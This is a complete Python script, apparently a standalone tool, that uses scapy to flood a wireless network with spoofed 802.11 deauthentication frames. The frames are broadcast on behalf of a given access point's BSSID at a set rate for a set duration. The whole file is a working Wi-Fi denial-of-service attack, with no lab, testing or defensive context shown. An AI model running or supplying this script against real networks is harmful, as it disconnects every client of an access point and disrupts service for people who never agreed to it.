#!/usr/bin/env python3
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

bssid = sys.argv[1]
iface = sys.argv[2]
fps = float(sys.argv[3])
duration = int(sys.argv[4])

delay = 1.0 / fps
frame = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)

end = time.time() + duration
count = 0
while time.time() < end:
    sendp(frame, iface=iface, count=1, verbose=False)
    count += 1
    time.sleep(delay)
print(f"Done. Sent {count} frames at {fps} fps for {duration}s.")
